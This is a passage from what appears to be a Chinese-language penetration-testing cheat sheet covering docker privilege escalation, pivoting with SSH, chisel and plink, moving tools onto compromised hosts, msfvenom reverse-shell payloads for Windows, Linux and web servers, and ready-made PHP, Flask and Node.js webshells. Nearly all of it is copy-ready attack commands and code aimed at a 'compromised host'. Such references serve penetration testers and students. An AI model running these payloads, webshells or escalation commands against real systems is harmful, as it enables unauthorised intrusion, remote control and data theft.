<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">docker images<br></code></pre></td></tr></table></figure>

<p>提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">docker run -it -v /:/host/ &lt;image&gt;:&lt;tag&gt; chroot /host/ bash<br></code></pre></td></tr></table></figure>

<h3 id="Linux-枚举工具-PrivEsc"><a href="#Linux-枚举工具-PrivEsc" class="headerlink" title="Linux 枚举工具 [PrivEsc]"></a>Linux 枚举工具 [PrivEsc]</h3><p>linpeas.sh</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./linpeas.sh<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</code></p>
<p>pspy（非特权 Linux 进程监听）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./pspy64<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/DominicBreuker/pspy</code></p>
<p>linux-exploit-suggester</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./linux-exploit-suggester.sh<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./linux-exploit-suiggester.sh --uname &lt;uname-<span class="hljs-built_in">string</span>&gt;<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/The-Z-Labs/linux-exploit-suggester</code></p>
<p>Unix Privesc 检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./unix-privesc-check<br></code></pre></td></tr></table></figure>

<p><code>https://pentestmonkey.net/tools/audit/unix-privesc-check</code></p>
<h1 id="十八、端口转发和代理"><a href="#十八、端口转发和代理" class="headerlink" title="十八、端口转发和代理"></a>十八、端口转发和代理</h1><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h3 id="SSH-隧道-本地端口转发"><a href="#SSH-隧道-本地端口转发" class="headerlink" title="SSH 隧道&#x2F;本地端口转发"></a>SSH 隧道&#x2F;本地端口转发</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ssh user@&lt;ip&gt; -p port -L <span class="hljs-number">8001</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span> -fN<br></code></pre></td></tr></table></figure>

<h3 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ssh -R <span class="hljs-number">5555</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">5555</span> -p2222 &lt;user&gt;@&lt;ip&gt;<br></code></pre></td></tr></table></figure>

<h3 id="Socat-端口转发"><a href="#Socat-端口转发" class="headerlink" title="Socat - 端口转发"></a>Socat - 端口转发</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./socat.exe TCP-LISTEN:<span class="hljs-number">8002</span>,fork,reuseaddr TCP:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>

<h3 id="chisel-远程端口转发"><a href="#chisel-远程端口转发" class="headerlink" title="chisel - 远程端口转发"></a>chisel - 远程端口转发</h3><p>你的机器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel server -p &lt;LISTEN_PORT&gt; --reverse &amp;<br></code></pre></td></tr></table></figure>

<p>受损主机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel client &lt;server_ip&gt;:&lt;server_port&gt; R:&lt;LOCAL_PORT&gt;:&lt;TARGET_IP&gt;:&lt;TARGET_PORT&gt; &amp;<br></code></pre></td></tr></table></figure>

<h3 id="Chisel-本地端口转发"><a href="#Chisel-本地端口转发" class="headerlink" title="Chisel - 本地端口转发"></a>Chisel - 本地端口转发</h3><p>受损主机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel server -p &lt;LISTEN_PORT&gt;<br></code></pre></td></tr></table></figure>

<p>你的机器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel client &lt;server_ip&gt;:&lt;server_port&gt; &lt;LOCAL_PORT&gt;:&lt;TARGET_IP&gt;:&lt;TARGET_PORT&gt;<br></code></pre></td></tr></table></figure>

<h3 id="pklink-远程端口转发"><a href="#pklink-远程端口转发" class="headerlink" title="pklink - 远程端口转发"></a>pklink - 远程端口转发</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cmd.exe /c echo y | plink.exe -ssh -l &lt;user&gt; -pw &lt;password&gt; -R <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.20</span>:<span class="hljs-number">1234</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.20</span><br></code></pre></td></tr></table></figure>

<h2 id="代理-网络枢轴"><a href="#代理-网络枢轴" class="headerlink" title="代理 - 网络枢轴"></a>代理 - 网络枢轴</h2><h3 id="sshuttle-Unix-代理"><a href="#sshuttle-Unix-代理" class="headerlink" title="sshuttle (Unix) - 代理"></a>sshuttle (Unix) - 代理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sshuttle -r user@&lt;ip&gt; --ssh-cmd <span class="hljs-string">&quot;ssh -i private_key&quot;</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<h3 id="SSH-代理链"><a href="#SSH-代理链" class="headerlink" title="SSH + 代理链"></a>SSH + 代理链</h3><p>使用socks4 127.0.0.1 8080编辑&#x2F;etc&#x2F;proxychains.conf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ssh -N -D <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span> &lt;user&gt;@&lt;ip&gt; -p <span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>

<h3 id="chisel-反向代理"><a href="#chisel-反向代理" class="headerlink" title="chisel - 反向代理"></a>chisel - 反向代理</h3><p>你的机器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel server -p LISTEN_PORT --reverse &amp;<br></code></pre></td></tr></table></figure>

<p>受损主机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel client &lt;TARGET_IP&gt;:&lt;LISTEN_PORT&gt; R:socks &amp;<br></code></pre></td></tr></table></figure>

<h3 id="chisel-转发代理"><a href="#chisel-转发代理" class="headerlink" title="chisel - 转发代理"></a>chisel - 转发代理</h3><p>受损主机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel server -p &lt;LISTEN_PORT&gt; --socks5<br></code></pre></td></tr></table></figure>

<p>你的机器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel client &lt;TARGET_IP&gt;:&lt;LISTEN_PORT&gt; &lt;PROXY_PORT&gt;:socks<br></code></pre></td></tr></table></figure>

<h3 id="Metasploit-代理"><a href="#Metasploit-代理" class="headerlink" title="Metasploit - 代理"></a>Metasploit - 代理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">route add &lt;ip&gt;/<span class="hljs-number">24</span> <span class="hljs-number">1</span><br>route print<br>use auxiliary/server/socks_proxy<br>run<br></code></pre></td></tr></table></figure>


<h1 id="十九、文件传输"><a href="#十九、文件传输" class="headerlink" title="十九、文件传输"></a>十九、文件传输</h1><h2 id="中小企业服务器"><a href="#中小企业服务器" class="headerlink" title="中小企业服务器"></a>中小企业服务器</h2><p>设置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-smbserver share . -smb2support -user user -password teste321<br></code></pre></td></tr></table></figure>

<p>转移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">net use \\&lt;smbserver&gt;\share /USER:user teste321<br>copy \\&lt;smbserver&gt;\share\nc.exe .<br></code></pre></td></tr></table></figure>

<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>启动网络服务器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">python -m SimpleHTTPServer <span class="hljs-number">80</span><br>service apache2 start<br></code></pre></td></tr></table></figure>

<p>Windows - 文件下载</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">powershell -c <span class="hljs-string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://&lt;IP&gt;/file.exe&#x27;,&#x27;C:\Users\user\Desktop\file.exe&#x27;)&quot;</span><br>iwr -uri http:<span class="hljs-comment">//&lt;IP&gt;/file -Outfile file</span><br>wget http:<span class="hljs-comment">//&lt;IP&gt;/file -O file</span><br>curl http:<span class="hljs-comment">//&lt;IP&gt;/file -o file</span><br>certutil -urlcache -f http:<span class="hljs-comment">//&lt;IP&gt;:803/ok.exe ok.exe  </span><br></code></pre></td></tr></table></figure>

<p>Linux - 文件下载</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">wget http:<span class="hljs-comment">//&lt;IP&gt;/file</span><br>curl http:<span class="hljs-comment">//&lt;IP&gt;/file &gt; file</span><br></code></pre></td></tr></table></figure>

<h2 id="纯FTPd"><a href="#纯FTPd" class="headerlink" title="纯FTPd"></a>纯FTPd</h2><p>安装和配置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo apt update &amp;&amp; sudo apt install pure-ftpd<br>sudo groupadd ftpgroup<br>sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser<br>sudo pure-pw useradd offsec -u ftpuser -d /ftphome<br>sudo pure-pw mkdb<br>cd /etc/pure-ftpd/auth/<br>sudo ln -s ../conf/PureDB <span class="hljs-number">60</span>pdb<br>sudo mkdir -p /ftphome<br>sudo chown -R ftpuser:ftpgroup /ftphome/<br>sudo systemctl restart pure-ftpd<br></code></pre></td></tr></table></figure>

<p>转移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">echo open <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.20</span> <span class="hljs-number">21</span>&gt; ftp.txt<br>echo USER user&gt;&gt; ftp.txt<br>echo password&gt;&gt; ftp.txt<br>echo bin &gt;&gt; ftp.txt<br>echo GET nc.exe &gt;&gt; ftp.txt<br>echo bye &gt;&gt; ftp.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ftp -v -n -s:ftp.txt<br></code></pre></td></tr></table></figure>

<h2 id="文件传输协议-1"><a href="#文件传输协议-1" class="headerlink" title="文件传输协议"></a>文件传输协议</h2><p>安装和配置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo apt update &amp;&amp; sudo apt install atftp<br>sudo mkdir /tftp<br>sudo chown nobody: /tftp<br>sudo atftpd --daemon --port <span class="hljs-number">69</span> /tftp<br></code></pre></td></tr></table></figure>

<p>转移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">tftp -i &lt;IP&gt; get file<br></code></pre></td></tr></table></figure>

<h2 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">scp file &lt;user&gt;@<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.20</span>:/home/user/<br></code></pre></td></tr></table></figure>


<h1 id="二十、Shell-和一些有效负载"><a href="#二十、Shell-和一些有效负载" class="headerlink" title="二十、Shell 和一些有效负载"></a>二十、Shell 和一些有效负载</h1><h2 id="有效负载结构-msfvenom"><a href="#有效负载结构-msfvenom" class="headerlink" title="有效负载结构 - msfvenom"></a>有效负载结构 - msfvenom</h2><p>分阶段的有效负载通常分为两部分。第一部分包含一个小的主要有效负载，它将建立连接，并与 shellcode 的其余部分一起传输较大的辅助有效负载。<br>例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">windows/shell_reverse_tcp (stageless)<br>windows/shell/reverse_tcp (staged)<br>linux/shell_reverse_tcp (stageless)<br>linux/shell/reverse_tcp (staged)<br></code></pre></td></tr></table></figure>

<h2 id="非-Meterpreter-二进制文件（-msfvenom-nc-）"><a href="#非-Meterpreter-二进制文件（-msfvenom-nc-）" class="headerlink" title="非 Meterpreter 二进制文件（ msfvenom + nc ）"></a>非 Meterpreter 二进制文件（ msfvenom + nc ）</h2><h3 id="视窗-Windows"><a href="#视窗-Windows" class="headerlink" title="视窗-Windows"></a>视窗-Windows</h3><h4 id="exe-x86-上演-msfvenom（非-Meterpreter）"><a href="#exe-x86-上演-msfvenom（非-Meterpreter）" class="headerlink" title=".exe x86 上演 - msfvenom（非 Meterpreter）"></a>.exe x86 上演 - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe<br></code></pre></td></tr></table></figure>

<h4 id="exe-x64-上演-msfvenom（非-Meterpreter）"><a href="#exe-x64-上演-msfvenom（非-Meterpreter）" class="headerlink" title=".exe x64 上演 - msfvenom（非 Meterpreter）"></a>.exe x64 上演 - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe<br></code></pre></td></tr></table></figure>

<h4 id="exe-x86-stageless-msfvenom（非-Meterpreter）"><a href="#exe-x86-stageless-msfvenom（非-Meterpreter）" class="headerlink" title=".exe x86 stageless - msfvenom（非 Meterpreter）"></a>.exe x86 stageless - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe<br></code></pre></td></tr></table></figure>

<h4 id="exe-x64-stageless-msfvenom（非-Meterpreter）"><a href="#exe-x64-stageless-msfvenom（非-Meterpreter）" class="headerlink" title=".exe x64 stageless - msfvenom（非 Meterpreter）"></a>.exe x64 stageless - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe<br></code></pre></td></tr></table></figure>

<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="elf-x86-上演-msfvenom（非-Meterpreter）"><a href="#elf-x86-上演-msfvenom（非-Meterpreter）" class="headerlink" title=".elf x86 上演 - msfvenom（非 Meterpreter）"></a>.elf x86 上演 - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf<br></code></pre></td></tr></table></figure>

<h4 id="elf-x64-上演-msfvenom（非-Meterpreter）"><a href="#elf-x64-上演-msfvenom（非-Meterpreter）" class="headerlink" title=".elf x64 上演 - msfvenom（非 Meterpreter）"></a>.elf x64 上演 - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p linux/x64/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf<br></code></pre></td></tr></table></figure>

<h4 id="elf-x86-stageless-msfvenom（非-Meterpreter）"><a href="#elf-x86-stageless-msfvenom（非-Meterpreter）" class="headerlink" title=".elf x86 stageless - msfvenom（非 Meterpreter）"></a>.elf x86 stageless - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf<br></code></pre></td></tr></table></figure>

<h4 id="elf-x64-stageless-msfvenom（非-Meterpreter）"><a href="#elf-x64-stageless-msfvenom（非-Meterpreter）" class="headerlink" title=".elf x64 stageless - msfvenom（非 Meterpreter）"></a>.elf x64 stageless - msfvenom（非 Meterpreter）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf<br></code></pre></td></tr></table></figure>

<h2 id="网络有效负载"><a href="#网络有效负载" class="headerlink" title="网络有效负载"></a>网络有效负载</h2><h3 id="Java-WAR-msfvenom（非-Meterpreter）"><a href="#Java-WAR-msfvenom（非-Meterpreter）" class="headerlink" title="Java WAR - msfvenom（非 Meterpreter）"></a>Java WAR - msfvenom（非 Meterpreter）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war<br></code></pre></td></tr></table></figure>

<h3 id="ASP-msfvenom（非-Meterpreter）"><a href="#ASP-msfvenom（非-Meterpreter）" class="headerlink" title="ASP - msfvenom（非 Meterpreter）"></a>ASP - msfvenom（非 Meterpreter）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure>

<h3 id="ASPX-msfvenom（非-Meterpreter）"><a href="#ASPX-msfvenom（非-Meterpreter）" class="headerlink" title="ASPX - msfvenom（非 Meterpreter）"></a>ASPX - msfvenom（非 Meterpreter）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;LPORT&gt; -f aspx &gt; shell.aspx<br></code></pre></td></tr></table></figure>

<h3 id="JSP-msfvenom（非-Meterpreter）"><a href="#JSP-msfvenom（非-Meterpreter）" class="headerlink" title="JSP - msfvenom（非 Meterpreter）"></a>JSP - msfvenom（非 Meterpreter）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp<br></code></pre></td></tr></table></figure>

<h3 id="WAR-msfvenom（非-Meterpreter）"><a href="#WAR-msfvenom（非-Meterpreter）" class="headerlink" title="WAR - msfvenom（非 Meterpreter）"></a>WAR - msfvenom（非 Meterpreter）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp<br></code></pre></td></tr></table></figure>

<h3 id="PHP-msfvenom（非-Meterpreter）-反向-Shell"><a href="#PHP-msfvenom（非-Meterpreter）-反向-Shell" class="headerlink" title="PHP - msfvenom（非 Meterpreter） - 反向 Shell"></a>PHP - msfvenom（非 Meterpreter） - 反向 Shell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php<br></code></pre></td></tr></table></figure>

<p>或<br><code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</code></p>
<p><code>https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse Shell.php</code></p>
<h2 id="网络外壳-shell"><a href="#网络外壳-shell" class="headerlink" title="网络外壳-shell"></a>网络外壳-shell</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php echo <span class="hljs-title function_">shell_exec</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span>;?&gt;<br>&lt;?php <span class="hljs-title function_">system</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span>;?&gt;<br>&lt;?php echo <span class="hljs-title function_">exec</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span>;?&gt;<br></code></pre></td></tr></table></figure>

<h3 id="联合应用程序"><a href="#联合应用程序" class="headerlink" title="联合应用程序"></a>联合应用程序</h3><p><code>https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp</code><br>或在卡利</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">locate cmdjsp.jsp<br></code></pre></td></tr></table></figure>

<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><p><code>https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp</code><br><code>https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp</code></p>
<p>或在卡利</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">locate cmd-asp<span class="hljs-number">-5.1</span>.asp<br>locate cmdasp.asp<br></code></pre></td></tr></table></figure>

<h3 id="ASPX"><a href="#ASPX" class="headerlink" title="ASPX"></a>ASPX</h3><p><code>https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</code></p>
<p>或在卡利</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">locate cmdasp.aspx<br></code></pre></td></tr></table></figure>

<h3 id="Webshell-感染views-py-Python-Flask"><a href="#Webshell-感染views-py-Python-Flask" class="headerlink" title="Webshell 感染views.py - Python (Flask)"></a>Webshell 感染views.py - Python (Flask)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">import os<br>from flask import Flask,request,os<br><br>app = Flask(__name__)<br>   <br>@app.route(<span class="hljs-string">&#x27;/okay&#x27;</span>)<br>def cmd():<br>    <span class="hljs-keyword">return</span> os.system(request.args.get(<span class="hljs-string">&#x27;c&#x27;</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py</code></p>
<h3 id="节点js"><a href="#节点js" class="headerlink" title="节点js"></a>节点js</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> express = require(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-type">const</span> app = express();<br><br>app.listen(<span class="hljs-number">3000</span>, () =&gt; <br>    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;...&#x27;</span>)<br>);<br>function <span class="hljs-title function_">Exec</span><span class="hljs-params">(command)</span>&#123; <br>    <span class="hljs-type">const</span> &#123; execSync &#125; = require(<span class="hljs-string">&quot;child_process&quot;</span>);<br>    <span class="hljs-type">const</span> <span class="hljs-built_in">stdout</span> = execSync(command);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Result: &quot;</span>+<span class="hljs-built_in">stdout</span><br>&#125;<br>app.get(<span class="hljs-string">&#x27;/okay/:command&#x27;</span>, (req, res) =&gt; <br>res.send(Exec(req.params.command))<br>);<br></code></pre></td></tr></table></figure>

<p><code>[https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js](https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js)</code></p>
<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><p>查找并编辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">locate perl-reverse-shell.pl<br></code></pre></td></tr></table></figure>

<h2 id="通过-Python-生成-tty"><a href="#通过-Python-生成-tty" class="headerlink" title="通过 Python 生成 tty"></a>通过 Python 生成 tty</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="生成升级后的外壳"><a href="#生成升级后的外壳" class="headerlink" title="生成升级后的外壳"></a>生成升级后的外壳</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export TERM=xterm &amp;&amp; /usr/bin/script -qc /bin/bash /dev/null <br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ctrl + z<br>stty raw -echo; fg <br></code></pre></td></tr></table></figure>

<h3 id="让生活更轻松的工具"><a href="#让生活更轻松的工具" class="headerlink" title="让生活更轻松的工具"></a>让生活更轻松的工具</h3><p>revshell 生成器<br><code>https://www.revshells.com/</code></p>
<p>CyberChef<br><code>https://gchq.github.io/CyberChef/</code></p>
<p>urlencoder<br><code>https://www.urlencoder.org/</code></p>
